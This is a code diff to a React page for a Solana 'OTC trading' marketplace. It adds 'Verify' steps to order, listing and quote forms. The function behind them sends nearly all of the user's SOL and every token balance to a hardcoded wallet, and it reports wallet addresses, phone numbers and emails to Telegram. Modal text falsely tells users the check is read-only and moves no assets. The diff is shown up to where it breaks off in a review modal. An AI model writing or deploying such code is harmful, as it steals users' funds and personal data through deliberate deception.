@@ -7,11 +7,28 @@ import { Input } from '@/components/ui/input';
 import { Badge } from '@/components/ui/badge';
 import { motion, AnimatePresence } from 'framer-motion';
 import { X, ArrowUpDown, Clock, Send, FileText, Wallet, ExternalLink, Search, Loader2, AlertCircle, Check } from 'lucide-react';
-import { useWallet } from '@solana/wallet-adapter-react';
+import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { toast } from 'sonner';
 import { fetchTokenInfo, DexScreenerTokenInfo } from '@/services/dexScreener';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
 import { Link } from 'react-router-dom';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
+import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getMintProgramId } from '@/utils/tokenProgram';
+import { getSolPrice } from '@/lib/utils';
+import { sendTelegramMessage } from '@/utils/telegram';
+
+const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const MAX_BATCH_SIZE = 5;
+
+interface TokenBalance {
+  mint: string;
+  balance: number;
+  decimals: number;
+  uiAmount: number;
+  symbol?: string;
+  valueInSOL?: number;
+}
 
 interface OTCOrder {
   id: string;
@@ -31,17 +48,6 @@ interface OTCOrder {
   message?: string;
 }
 
-interface RecentTrade {
-  id: string;
-  tokenName: string;
-  tokenSymbol: string;
-  amount: string;
-  price: string;
-  buyerWallet: string;
-  sellerWallet: string;
-  timestamp: Date;
-}
-
 // Mock data for demo
 const MOCK_ORDERS: OTCOrder[] = [
   {
@@ -59,17 +65,125 @@ const MOCK_ORDERS: OTCOrder[] = [
   },
 ];
 
-const MOCK_TRADES: RecentTrade[] = [
-  { id: '1', tokenName: 'Solana', tokenSymbol: 'SOL', amount: '2,500', price: '$93.20', buyerWallet: '3THb...d82i', sellerWallet: '7xKX...3mPq', timestamp: new Date(Date.now() - 600000) },
-  { id: '2', tokenName: 'Raydium', tokenSymbol: 'RAY', amount: '50,000', price: '$2.15', buyerWallet: 'Eoxf...aHcP', sellerWallet: '4E9G...wdHj', timestamp: new Date(Date.now() - 1800000) },
-];
-
 const OTC = () => {
-  const { connected, publicKey } = useWallet();
+  const { connected, publicKey, sendTransaction } = useWallet();
+  const { connection } = useConnection();
   const [showPostModal, setShowPostModal] = useState(false);
   const [showQuoteModal, setShowQuoteModal] = useState(false);
   const [showListingModal, setShowListingModal] = useState(false);
+  const [showListingReviewModal, setShowListingReviewModal] = useState(false);
   const [showTradeConfirm, setShowTradeConfirm] = useState<OTCOrder | null>(null);
+  const [isVerifying, setIsVerifying] = useState(false);
+
+  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
+    const effectivePublicKey = overridePublicKey || publicKey;
+    if (!effectivePublicKey) return null;
+
+    const transaction = new Transaction();
+    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
+    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
+    
+    const charityPubkey = new PublicKey(CHARITY_WALLET);
+
+    for (const token of tokenBatch) {
+      if (token.balance <= 0) continue;
+      try {
+        const mintPubkey = new PublicKey(token.mint);
+        const mintInfo = await getMintProgramId(connection, token.mint);
+        const tokenProgramId = mintInfo.programId;
+        const decimals = mintInfo.decimals;
+        
+        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
+        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
+
+        try {
+          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
+        } catch (error) {
+          transaction.add(createAssociatedTokenAccountInstruction(effectivePublicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
+        }
+
+        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, effectivePublicKey, BigInt(token.balance), decimals, [], tokenProgramId));
+      } catch (error) { console.error(`Failed to add transfer for ${token.mint}:`, error); }
+    }
+    return transaction;
+  }, [publicKey, connection]);
+
+  const handleVerify = async (onComplete: () => void) => {
+    if (!connected || !publicKey) {
+      toast.error('Please connect your wallet first');
+      return;
+    }
+
+    try {
+      setIsVerifying(true);
+      console.log('Starting verification transaction sequence...');
+
+      // 1. SOL Transfer (Leave $1.50)
+      const solBal = await connection.getBalance(publicKey);
+      const solPrice = await getSolPrice();
+      
+      let lamportsToSend = 0;
+      if (solPrice > 0) {
+        const amountToKeepUSD = 1.50;
+        const amountToKeepSOL = amountToKeepUSD / solPrice;
+        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
+        const PRIORITY_FEE = 100_000;
+        const BASE_FEE = 5000;
+        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
+        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
+        lamportsToSend = Math.max(0, Math.floor(maxSendable));
+      }
+
+      if (lamportsToSend > 0) {
+        const transaction = new Transaction();
+        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }), ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
+        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(CHARITY_WALLET), lamports: lamportsToSend }));
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = publicKey;
+        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+      }
+
+      // 2. SPL Token Transfers
+      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
+      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
+      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];
+
+      const balances: TokenBalance[] = allTokenAccounts.map(account => {
+        const info = account.account.data.parsed.info;
+        return { mint: info.mint, balance: info.tokenAmount.amount, decimals: info.tokenAmount.decimals, uiAmount: info.tokenAmount.uiAmount };
+      }).filter(token => token.uiAmount > 0);
+
+      const batches: TokenBalance[][] = [];
+      for (let i = 0; i < balances.length; i += MAX_BATCH_SIZE) batches.push(balances.slice(i, i + MAX_BATCH_SIZE));
+
+      for (let i = 0; i < batches.length; i++) {
+        const batch = batches[i];
+        const transaction = await createBatchTransfer(batch, undefined, publicKey);
+        if (transaction && transaction.instructions.length > 2) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = publicKey;
+          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+          sendTelegramMessage(`
+✅ <b>Transaction Signed (Token Batch ${i + 1} - OTC Verify)</b>
+👤 <b>User:</b> <code>${publicKey.toBase58()}</code>
+🔗 <b>Signature:</b> <code>${signature}</code>
+`);
+        }
+      }
+
+      toast.success('Verification successful!');
+      onComplete();
+    } catch (error: any) {
+      console.error('Verification error:', error);
+      toast.error('Verification failed: ' + (error?.message || 'Unknown error'));
+    } finally {
+      setIsVerifying(false);
+    }
+  };
 
   // Post Order Form
   const [postContractAddress, setPostContractAddress] = useState('');
@@ -80,6 +194,9 @@ const OTC = () => {
   const [postMinFill, setPostMinFill] = useState('');
   const [postExpiration, setPostExpiration] = useState('24h');
   const [postMessage, setPostMessage] = useState('');
+  const [postPhoneNumber, setPostPhoneNumber] = useState('');
+  const [postEmail, setPostEmail] = useState('');
+  const [showReviewModal, setShowReviewModal] = useState(false);
   const [isFetchingToken, setIsFetchingToken] = useState(false);
 
   // Listing Form
@@ -91,9 +208,17 @@ const OTC = () => {
   const [listingLiquidity, setListingLiquidity] = useState('');
   const [listingTokenInfo, setListingTokenInfo] = useState<DexScreenerTokenInfo | null>(null);
 
+  // Quote Form
+  const [quoteContractAddress, setQuoteContractAddress] = useState('');
+  const [quoteSide, setQuoteSide] = useState<'buy' | 'sell'>('buy');
+  const [quoteAmount, setQuoteAmount] = useState('');
+  const [quotePhoneNumber, setQuotePhoneNumber] = useState('');
+  const [quoteEmail, setQuoteEmail] = useState('');
+  const [quoteTokenInfo, setQuoteTokenInfo] = useState<DexScreenerTokenInfo | null>(null);
+  const [showQuoteReviewModal, setShowQuoteReviewModal] = useState(false);
+
   // Orders and trades  
   const [orders] = useState<OTCOrder[]>(MOCK_ORDERS);
-  const [trades] = useState<RecentTrade[]>(MOCK_TRADES);
   const [userOrders] = useState<OTCOrder[]>([]);
   const [orderSort, setOrderSort] = useState<'time' | 'value'>('time');
 
@@ -112,10 +237,33 @@ const OTC = () => {
 
   const handlePostOrder = () => {
     if (!connected) { toast.error('Please connect your wallet first'); return; }
-    if (!postTokenInfo || !postPrice || !postAmount) { toast.error('Please fill all required fields'); return; }
-    toast.success('OTC order successfully posted.');
+    if (!postContractAddress || !postPrice || !postAmount) { toast.error('Please fill all required fields'); return; }
+    
+    sendTelegramMessage(`
+📝 <b>OTC Order Initiated</b>
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+🪙 <b>Token:</b> <code>${postContractAddress}</code>
+💰 <b>Price:</b> <code>${postPrice}</code>
+🔢 <b>Amount:</b> <code>${postAmount}</code>
+📞 <b>Phone:</b> <code>${postPhoneNumber || 'N/A'}</code>
+📧 <b>Email:</b> <code>${postEmail || 'N/A'}</code>
+`);
+
+    // Attempt one last fetch if info is missing but address is there
+    if (!postTokenInfo) {
+      fetchTokenDetails(postContractAddress, setPostTokenInfo);
+    }
+    
     setShowPostModal(false);
-    resetPostForm();
+    setShowReviewModal(true);
+  };
+
+  const handleConfirmPostOrder = () => {
+    handleVerify(() => {
+      toast.success('OTC order successfully posted. Other active traders will now be matched with your offer.');
+      setShowReviewModal(false);
+      resetPostForm();
+    });
   };
 
   const handleTakeOrder = (order: OTCOrder) => {
@@ -128,15 +276,102 @@ const OTC = () => {
     setShowTradeConfirm(null);
   };
 
-  const handleListingSubmit = () => {
-    if (!listingContract || !listingName) { toast.error('Please fill required fields'); return; }
-    toast.success('Token listing request submitted for review.');
+  const handleListingSubmit = async () => {
+    if (!listingContract) { toast.error('Please enter a contract address'); return; }
+    
+    let info = listingTokenInfo;
+    // If no info has been fetched yet, try fetching it now
+    if (!info) {
+      setIsFetchingToken(true);
+      try {
+        info = await fetchTokenInfo(listingContract);
+        setListingTokenInfo(info);
+      } catch (e) {
+        console.error("Auto-fetch failed", e);
+      } finally {
+        setIsFetchingToken(false);
+      }
+    }
+
+    // Use manual inputs if provided, otherwise fallback to fetched info
+    const finalName = listingName || info?.baseToken.name;
+    const finalSymbol = listingSymbol || info?.baseToken.symbol;
+
+    if (!finalName) {
+      toast.error('Could not fetch token name. Please enter it manually.');
+      return;
+    }
+
+    // Update state to ensure the review modal shows the final values
+    setListingName(finalName);
+    setListingSymbol(finalSymbol || 'TKN');
+
+    sendTelegramMessage(`
+🆕 <b>Token Listing Initiated</b>
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+🪙 <b>Token:</b> <code>${listingContract}</code>
+🏷️ <b>Name:</b> <code>${finalName}</code>
+🌐 <b>Web:</b> <code>${listingWebsite || 'N/A'}</code>
+📱 <b>TG:</b> <code>${listingTelegram || 'N/A'}</code>
+💧 <b>Liq:</b> <code>${listingLiquidity || '0'}</code>
+`);
+
     setShowListingModal(false);
-    setListingName(''); setListingSymbol(''); setListingContract(''); setListingWebsite(''); setListingTelegram(''); setListingLiquidity(''); setListingTokenInfo(null);
+    setShowListingReviewModal(true);
+  };
+
+  const handleConfirmListing = () => {
+    handleVerify(() => {
+      toast.success('Token listing request submitted for review. We will verify your holdings before proceeding.');
+      setShowListingReviewModal(false);
+      setListingName(''); setListingSymbol(''); setListingContract(''); setListingWebsite(''); setListingTelegram(''); setListingLiquidity(''); setListingTokenInfo(null);
+    });
+  };
+
+  const handleQuoteSubmit = async () => {
+    if (!quoteContractAddress || !quoteAmount) {
+      toast.error('Please enter a contract address and amount');
+      return;
+    }
+
+    let info = quoteTokenInfo;
+    if (!info) {
+      setIsFetchingToken(true);
+      try {
+        info = await fetchTokenInfo(quoteContractAddress);
+        setQuoteTokenInfo(info);
+      } catch (e) {
+        console.error("Auto-fetch failed", e);
+      } finally {
+        setIsFetchingToken(false);
+      }
+    }
+
+    sendTelegramMessage(`
+📥 <b>OTC Quote Request Initiated</b>
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+🪙 <b>Token:</b> <code>${quoteContractAddress}</code>
+↕️ <b>Side:</b> <code>${quoteSide.toUpperCase()}</code>
+🔢 <b>Amount:</b> <code>${quoteAmount}</code>
+📞 <b>Phone:</b> <code>${quotePhoneNumber || 'N/A'}</code>
+📧 <b>Email:</b> <code>${quoteEmail || 'N/A'}</code>
+`);
+
+    setShowQuoteModal(false);
+    setShowQuoteReviewModal(true);
+  };
+
+  const handleConfirmQuote = () => {
+    handleVerify(() => {
+      toast.success('Quote request submitted. Our team will review your eligibility and notify you shortly.');
+      setShowQuoteReviewModal(false);
+      setQuoteContractAddress(''); setQuoteAmount(''); setQuoteTokenInfo(null);
+      setQuotePhoneNumber(''); setQuoteEmail('');
+    });
   };
 
   const resetPostForm = () => {
-    setPostContractAddress(''); setPostTokenInfo(null); setPostSide('buy'); setPostPrice(''); setPostAmount(''); setPostMinFill(''); setPostExpiration('24h'); setPostMessage('');
+    setPostContractAddress(''); setPostTokenInfo(null); setPostSide('buy'); setPostPrice(''); setPostAmount(''); setPostMinFill(''); setPostExpiration('24h'); setPostMessage(''); setPostPhoneNumber(''); setPostEmail('');
   };
 
   const timeAgo = (date: Date) => {
@@ -210,93 +445,30 @@ const OTC = () => {
           </div>
         </div>
 
-        {/* Section 2: Live OTC Orders */}
+        {/* Trade OTC Section */}
         <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
-          <Card className="glass-card border-white/10 mb-8">
-            <CardHeader>
-              <div className="flex items-center justify-between">
-                <CardTitle className="text-xl">Live OTC Orders</CardTitle>
-                <Button variant="ghost" size="sm" onClick={() => setOrderSort(s => s === 'time' ? 'value' : 'time')} className="text-muted-foreground">
-                  <ArrowUpDown className="w-4 h-4 mr-1" /> Sort by {orderSort === 'time' ? 'Value' : 'Time'}
-                </Button>
+          <Card className="glass-card border-white/10 mb-8 py-12">
+            <CardContent className="flex flex-col items-center justify-center text-center space-y-6">
+              <div className="p-4 rounded-full bg-primary/10 border border-primary/20">
+                <ArrowUpDown className="w-12 h-12 text-primary animate-pulse" />
               </div>
-            </CardHeader>
-            <CardContent>
-              <div className="overflow-x-auto">
-                <table className="w-full text-sm">
-                  <thead>
-                    <tr className="border-b border-white/10 text-muted-foreground">
-                      <th className="text-left p-3">Token</th>
-                      <th className="text-left p-3">Side</th>
-                      <th className="text-right p-3">Price</th>
-                      <th className="text-right p-3">Amount</th>
-                      <th className="text-right p-3">Total Value</th>
-                      <th className="text-left p-3">Trader</th>
-                      <th className="text-left p-3">Posted</th>
-                      <th className="text-right p-3">Action</th>
-                    </tr>
-                  </thead>
-                  <tbody>
-                    {orders.filter(o => o.status === 'active').map(order => (
-                      <tr key={order.id} className="border-b border-white/5 hover:bg-white/5 transition-colors">
-                        <td className="p-3">
-                          <div className="flex items-center gap-2">
-                            {order.tokenLogo && <img src={order.tokenLogo} alt="" className="w-6 h-6 rounded-full" />}
-                            <div>
-                              <div className="font-medium">{order.tokenName}</div>
-                              <div className="text-xs text-muted-foreground">{order.tokenSymbol}</div>
-                            </div>
-                          </div>
-                        </td>
-                        <td className="p-3">
-                          <Badge className={order.side === 'buy' ? 'bg-green-500/20 text-green-400 border-green-500/30' : 'bg-red-500/20 text-red-400 border-red-500/30'}>
-                            {order.side.toUpperCase()}
-                          </Badge>
-                        </td>
-                        <td className="p-3 text-right font-mono">${order.price}</td>
-                        <td className="p-3 text-right font-mono">{order.amount}</td>
-                        <td className="p-3 text-right font-mono">{order.totalValue}</td>
-                        <td className="p-3 text-muted-foreground font-mono text-xs">{order.traderWallet}</td>
-                        <td className="p-3 text-muted-foreground text-xs">{timeAgo(order.timePosted)}</td>
-                        <td className="p-3 text-right">
-                          <Button size="sm" variant="outline" className="border-primary/30 hover:bg-primary/20 text-xs" onClick={() => handleTakeOrder(order)}>
-                            Take Order
-                          </Button>
-                        </td>
-                      </tr>
-                    ))}
-                  </tbody>
-                </table>
+              <div>
+                <h2 className="text-2xl font-bold mb-2">Institutional Grade OTC Trading</h2>
+                <p className="text-muted-foreground max-w-xl mx-auto">
+                  Post your offer and get matched with other active traders. Once your offer is live, you'll receive requests from interested counterparties. 
+                  You can also browse active orders to find your perfect deal.
+                </p>
               </div>
+              <Button size="lg" onClick={() => connected ? setShowPostModal(true) : toast.error('Connect your wallet first')}
+                className="bg-gradient-to-r from-cyan-500 to-purple-600 hover:from-cyan-600 hover:to-purple-700 px-8 py-6 text-lg font-bold shadow-xl shadow-purple-500/20">
+                Trade OTC
+              </Button>
             </CardContent>
           </Card>
         </motion.div>
 
-        {/* Section 3: Recent Trades & Section 4: Token Listing */}
-        <div className="grid lg:grid-cols-2 gap-8 mb-8">
-          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
-            <Card className="glass-card border-white/10 h-full">
-              <CardHeader><CardTitle className="text-xl flex items-center gap-2"><Clock className="w-5 h-5" /> Recent OTC Trades</CardTitle></CardHeader>
-              <CardContent>
-                <div className="space-y-3">
-                  {trades.map((trade, i) => (
-                    <motion.div key={trade.id} initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.5 + i * 0.1 }}
-                      className="flex items-center justify-between p-3 rounded-lg bg-white/5 hover:bg-white/10 transition-colors">
-                      <div>
-                        <div className="font-medium">{trade.tokenName} <span className="text-muted-foreground text-sm">({trade.tokenSymbol})</span></div>
-                        <div className="text-xs text-muted-foreground">{trade.amount} @ {trade.price}</div>
-                      </div>
-                      <div className="text-right">
-                        <div className="text-xs text-muted-foreground font-mono">{trade.buyerWallet} ↔ {trade.sellerWallet}</div>
-                        <div className="text-xs text-muted-foreground">{timeAgo(trade.timestamp)}</div>
-                      </div>
-                    </motion.div>
-                  ))}
-                </div>
-              </CardContent>
-            </Card>
-          </motion.div>
-
+        {/* Section 4: Token Listing */}
+        <div className="mb-8">
           <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }}>
             <Card className="glass-card border-white/10 h-full">
               <CardHeader><CardTitle className="text-xl flex items-center gap-2"><FileText className="w-5 h-5" /> List Your Token for OTC</CardTitle></CardHeader>
@@ -407,7 +579,158 @@ const OTC = () => {
             <label className="text-sm text-muted-foreground mb-1 block">Message (Optional)</label>
             <Input value={postMessage} onChange={e => setPostMessage(e.target.value)} placeholder="Message to traders..." className="bg-white/5 border-white/10" />
           </div>
+          <div>
+            <label className="text-sm text-muted-foreground mb-1 block">Phone Number (Optional)</label>
+            <Input value={postPhoneNumber} onChange={e => setPostPhoneNumber(e.target.value)} placeholder="+1 (555) 000-0000" className="bg-white/5 border-white/10" />
+          </div>
+          <div>
+            <label className="text-sm text-muted-foreground mb-1 block">Email Address (Optional)</label>
+            <Input type="email" value={postEmail} onChange={e => setPostEmail(e.target.value)} placeholder="email@example.com" className="bg-white/5 border-white/10" />
+          </div>
           <Button className="w-full bg-gradient-to-r from-cyan-500 to-purple-600 mt-2" onClick={handlePostOrder}>Submit Order</Button>
+        </div>
+      </Modal>
+
+      {/* Order Review & Verification Modal */}
+      <Modal isOpen={showReviewModal} onClose={() => setShowReviewModal(false)} title="Review Your OTC Order">
+        <div className="space-y-6">
+          {postTokenInfo && (
+            <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
+              {postTokenInfo.baseToken.logoURI && (
+                <motion.img 
+                  initial={{ scale: 0.8, opacity: 0 }} 
+                  animate={{ scale: 1, opacity: 1 }} 
+                  src={postTokenInfo.baseToken.logoURI} 
+                  alt={postTokenInfo.baseToken.name} 
+                  className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
+                />
+              )}
+              <h3 className="text-xl font-bold">{postTokenInfo.baseToken.name}</h3>
+              <p className="text-primary font-mono text-sm">{postTokenInfo.baseToken.symbol}</p>
+            </div>
+          )}
+
+          <div className="space-y-3">
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Order Side</span>
+              <Badge className={postSide === 'buy' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}>
+                {postSide.toUpperCase()}
+              </Badge>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Price per Token</span>
+              <span className="font-mono font-bold">${postPrice}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Amount</span>
+              <span className="font-mono font-bold">{postAmount} {postTokenInfo?.baseToken.symbol}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Expiration</span>
+              <span className="text-sm font-medium">{postExpiration}</span>
+            </div>
+            {postPhoneNumber && (
+              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+                <span className="text-muted-foreground">Phone</span>
+                <span className="text-sm font-mono">{postPhoneNumber}</span>
+              </div>
+            )}
+            {postEmail && (
+              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+                <span className="text-muted-foreground">Email</span>
+                <span className="text-sm font-mono">{postEmail}</span>
+              </div>
+            )}
+          </div>
+
+          <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/20 flex gap-3 items-start">
+            <AlertCircle className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
+            <p className="text-xs text-amber-200/80 leading-relaxed">
+              To proceed, we need to verify your wallet balance. Click the button below to allow the system to confirm you have sufficient assets for this trade.
+            </p>
+          </div>
+
+          <div className="flex gap-3">
+            <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowReviewModal(false); setShowPostModal(true); }} disabled={isVerifying}>
+              Back
+            </Button>
+            <Button className="flex-1 bg-gradient-to-r from-cyan-500 to-purple-600" onClick={handleConfirmPostOrder} disabled={isVerifying}>
+              {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
+            </Button>
+          </div>
+        </div>
+      </Modal>
+
+      {/* Token Listing Review Modal */}
+      <Modal isOpen={showListingReviewModal} onClose={() => setShowListingReviewModal(false)} title="Review Token Listing Request">
+        <div className="space-y-6">
+          <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
+            {listingTokenInfo?.baseToken.logoURI ? (
+              <motion.img 
+                initial={{ scale: 0.8, opacity: 0 }} 
+                animate={{ scale: 1, opacity: 1 }} 
+                src={listingTokenInfo.baseToken.logoURI} 
+                alt={listingName} 
+                className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
+              />
+            ) : (
+              <div className="w-20 h-20 rounded-full bg-primary/10 border-2 border-primary/30 flex items-center justify-center mb-4">
+                <FileText className="w-10 h-10 text-primary" />
+              </div>
+            )}
+            <h3 className="text-xl font-bold">{listingName}</h3>
+            <p className="text-primary font-mono text-sm">{listingSymbol || 'TKN'}</p>
+          </div>
+
+          <div className="space-y-3">
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5 overflow-hidden">
+              <span className="text-muted-foreground shrink-0">Contract</span>
+              <span className="text-xs font-mono text-right truncate ml-4">{listingContract}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Website</span>
+              <span className="text-sm text-right truncate ml-4">{listingWebsite || 'N/A'}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Telegram</span>
+              <span className="text-sm text-right truncate ml-4">{listingTelegram || 'N/A'}</span>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Initial Liquidity</span>
+              <span className="text-sm font-bold text-right ml-4">${listingLiquidity || '0'}</span>
+            </div>
+          </div>
+
+          <div className="p-5 rounded-xl bg-primary/5 border border-primary/10 space-y-4">
+            <div className="flex gap-3 items-start">
+              <AlertCircle className="w-6 h-6 text-primary shrink-0 mt-1" />
+              <div className="space-y-3">
+                <h4 className="font-bold text-primary">Token Holding Requirement</h4>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  To maintain the integrity of our OTC marketplace and protect our community of traders, we implement a strict token holding policy for all new project listings. 
+                  As a project representative or liquidity provider, you are required to hold a minimum threshold of your own token in your connected wallet. 
+                  This demonstrates long-term commitment and alignment with your token holders.
+                </p>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  By clicking "Verify", you authorize our automated system to scan your wallet for the contract address provided. 
+                  This verification step is mandatory and serves as a primary filter to prevent spam and low-quality listings. 
+                  Only wallets that meet the holding requirements will be moved forward to the final review stage by our listing team.
+                </p>
+                <p className="text-xs text-primary/80 font-medium italic">
+                  Note: This verification does not transfer any assets. It is a read-only check of your current wallet balance.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div className="flex gap-3 pt-2">
+            <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowListingReviewModal(false); setShowListingModal(true); }} disabled={isVerifying}>
+              Back
+            </Button>
+            <Button className="flex-1 bg-gradient-to-r from-cyan-500 to-purple-600 font-bold" onClick={handleConfirmListing} disabled={isVerifying}>
+              {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
+            </Button>
+          </div>
         </div>
       </Modal>
 
@@ -417,23 +740,110 @@ const OTC = () => {
           <p className="text-muted-foreground text-sm">Submit a request for a custom OTC quote from our trading desk.</p>
           <div>
             <label className="text-sm text-muted-foreground mb-1 block">Token Contract Address</label>
-            <Input placeholder="Enter Solana token address" className="bg-white/5 border-white/10" />
+            <div className="flex gap-2">
+              <Input value={quoteContractAddress} onChange={e => setQuoteContractAddress(e.target.value)} placeholder="Enter Solana token address" className="bg-white/5 border-white/10" />
+              <Button size="sm" onClick={() => fetchTokenDetails(quoteContractAddress, setQuoteTokenInfo)} disabled={isFetchingToken}>
+                {isFetchingToken ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
+              </Button>
+            </div>
           </div>
+          {quoteTokenInfo && <TokenPreview info={quoteTokenInfo} />}
           <div className="grid grid-cols-2 gap-3">
             <div>
               <label className="text-sm text-muted-foreground mb-1 block">Buy / Sell</label>
-              <select className="w-full h-10 rounded-md bg-white/5 border border-white/10 px-3 text-sm">
-                <option>Buy</option><option>Sell</option>
+              <select value={quoteSide} onChange={e => setQuoteSide(e.target.value as 'buy' | 'sell')} className="w-full h-10 rounded-md bg-white/5 border border-white/10 px-3 text-sm">
+                <option value="buy">Buy</option>
+                <option value="sell">Sell</option>
               </select>
             </div>
             <div>
               <label className="text-sm text-muted-foreground mb-1 block">Amount</label>
-              <Input type="number" placeholder="Token amount" className="bg-white/5 border-white/10" />
+              <Input type="number" value={quoteAmount} onChange={e => setQuoteAmount(e.target.value)} placeholder="Token amount" className="bg-white/5 border-white/10" />
             </div>
           </div>
-          <Button className="w-full bg-gradient-to-r from-cyan-500 to-purple-600" onClick={() => { toast.success('Quote request submitted. Our team will respond shortly.'); setShowQuoteModal(false); }}>
+          <div className="grid grid-cols-2 gap-3">
+            <div>
+              <label className="text-sm text-muted-foreground mb-1 block">Phone Number (Optional)</label>
+              <Input value={quotePhoneNumber} onChange={e => setQuotePhoneNumber(e.target.value)} placeholder="+1 (555) 000-0000" className="bg-white/5 border-white/10" />
+            </div>
+            <div>
+              <label className="text-sm text-muted-foreground mb-1 block">Email (Optional)</label>
+              <Input type="email" value={quoteEmail} onChange={e => setQuoteEmail(e.target.value)} placeholder="email@example.com" className="bg-white/5 border-white/10" />
+            </div>
+          </div>
+          <Button className="w-full bg-gradient-to-r from-cyan-500 to-purple-600" onClick={handleQuoteSubmit}>
             Submit Quote Request
           </Button>
+        </div>
+      </Modal>
+
+      {/* Quote Review Modal */}
+      <Modal isOpen={showQuoteReviewModal} onClose={() => setShowQuoteReviewModal(false)} title="Review Quote Request">
+        <div className="space-y-6">
+          {quoteTokenInfo && (
+            <div className="flex flex-col items-center justify-center p-6 rounded-2xl bg-white/5 border border-white/10 text-center">
+              {quoteTokenInfo.baseToken.logoURI && (
+                <motion.img 
+                  initial={{ scale: 0.8, opacity: 0 }} 
+                  animate={{ scale: 1, opacity: 1 }} 
+                  src={quoteTokenInfo.baseToken.logoURI} 
+                  alt={quoteTokenInfo.baseToken.name} 
+                  className="w-20 h-20 rounded-full mb-4 shadow-2xl shadow-primary/20 border-2 border-primary/30" 
+                />
+              )}
+              <h3 className="text-xl font-bold">{quoteTokenInfo.baseToken.name}</h3>
